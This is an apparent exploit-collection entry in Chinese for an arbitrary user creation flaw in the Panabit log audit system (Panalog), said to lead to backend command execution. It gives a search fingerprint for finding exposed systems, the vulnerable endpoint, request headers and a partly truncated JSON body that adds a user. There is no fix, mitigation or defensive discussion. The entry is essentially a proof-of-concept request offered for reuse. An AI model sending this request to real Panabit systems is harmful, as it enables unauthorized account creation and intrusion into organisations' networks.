# panabit日志审计系统任意用户创建漏洞和后台命令执行

- **系统**：panabit　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Panabit 日志系统"`
- **请求**：`POST /singleuser_action.php HTTP/1.1`

**请求体 / payload**
```
访问连接出现如下页面表示可能存在漏洞
/singleuser_action.php

通过POC添加用户
Host: xx.xx.xx.xx
Cookie: PHPSESSID=4dkc7q5hu7lkdlsfm5a0tcirn6
Content-Type: application/x-www-form-urlencoded
Content-Length: 578
{ "syncInfo": { "user": { "userId": "110", "userName": "110", "employeeId": "110", "departmentId": "110", "departmentName": "110", "coporationId": "110", "corporationName": "110", "userSex": "1",  "userDuty": "110", "userBirthday": "110", "userPost": "110", "userPostCode": "110", "userAlias": "110", "userRank": "110", "userPhone": "110", "userHomeAddress": "110", "userMobilePhone": "110", "userMailAddress": "110…（脚本共 787 字，完整版见原文）
```

**其他**
- panabit日志审计系统任意用户创建漏洞和后台命令执行: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Panabit panalog